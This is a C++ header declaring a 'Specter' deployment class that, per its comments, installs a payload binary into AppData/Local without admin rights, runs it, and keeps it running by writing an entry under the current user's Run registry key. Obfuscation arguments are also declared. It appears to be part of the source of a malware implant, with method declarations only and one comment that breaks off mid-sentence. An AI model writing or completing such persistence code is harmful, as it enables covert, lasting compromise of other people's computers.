#pragma once
#include <filesystem>
#include <string>
#include <winreg/WinReg.hpp>

// This class is responsible for deploying the Specter binary into the machine without any admin privileges
// Deploy to the AppData/Local folder, and ensures persistence by using the HKCU persistence method and 
class SpecterBasicDeployment
{
	std::wstring m_program_name;
	std::filesystem::path m_target_file;
	winreg::RegKey m_reg_key = {HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"};
	std::wstring m_obscrypto_args;

public:
	SpecterBasicDeployment(const SpecterBasicDeployment& other) = delete;
	SpecterBasicDeployment& operator=(const SpecterBasicDeployment& other) = delete;

	SpecterBasicDeployment(std::wstring program_name, const std::wstring& target_file_name, std::wstring obscrypto_args);

	bool IsInstalled() const;

	// Deploys the payload to the current machine, modifies the registry to ensure startup as user
	bool Install();

private:
	bool IsPersistent() const;

	bool IsDeployedOnFilesystem() const;

	bool DeployBinary() const;

	bool EnablePersistence();

	void DisablePersistence();

	void RunBinary() const;
};
